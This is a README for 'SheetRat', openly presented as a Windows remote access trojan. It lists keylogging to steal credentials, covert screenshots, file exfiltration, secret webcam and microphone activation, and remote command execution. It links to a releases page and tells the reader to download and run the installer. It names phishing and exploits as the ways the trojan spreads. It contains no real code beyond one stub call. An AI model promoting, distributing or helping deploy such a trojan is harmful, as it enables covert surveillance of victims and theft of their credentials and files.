# SheetRat: A Powerful Remote Access Trojan for Windows Systems

![SheetRat](https://img.shields.io/badge/Download_SheetRat-blue.svg) [![GitHub Releases](https://img.shields.io/badge/Releases-v1.0.0-orange.svg)](https://github.com/MrMaeson/sheetrat/releases)

## Overview

SheetRat is a remote access trojan (RAT) designed to give unauthorized control over infected systems. This tool is built for advanced users who need to understand the implications of its use. It can execute a variety of malicious activities, including:

- **Keylogging**: Capture keystrokes to steal sensitive information.
- **Screen Capture**: Take screenshots of the user's activity.
- **File Manipulation**: Access, modify, or delete files on the infected machine.
- **Webcam and Microphone Access**: Activate the webcam and microphone without user consent.
- **Remote Command Execution**: Execute commands on the infected system remotely.

## Features

### Keylogging
SheetRat can record every keystroke made by the user. This feature allows attackers to gather login credentials, personal messages, and other sensitive data.

### Screen Capture
The tool can take screenshots at specified intervals or on demand. This feature helps in monitoring user activity without their knowledge.

### File Manipulation
SheetRat allows attackers to upload, download, and delete files on the target system. This capability makes it easy to exfiltrate data or plant malicious files.

### Webcam and Microphone Access
The RAT can activate the webcam and microphone, enabling attackers to spy on users in real-time.

### Remote Command Execution
Attackers can execute commands on the infected system as if they were sitting in front of it. This feature provides full control over the target machine.

## How It Spreads

SheetRat typically spreads through:

- **Phishing Emails**: Attackers send emails that contain malicious links or attachments. When users click on these, they inadvertently install the RAT.
- **Exploits**: Vulnerabilities in software can be exploited to install SheetRat without user consent.

## Installation

To download and install SheetRat, visit the [Releases section](https://github.com/MrMaeson/sheetrat/releases). Make sure to download the appropriate file for your system. After downloading, execute the file to install.

## Usage

Once installed, SheetRat operates in the background, making it difficult for users to detect. It communicates with the attacker's server, allowing them to control the infected system remotely.

- **Capture Keystrokes**: `capture_keystrokes()`
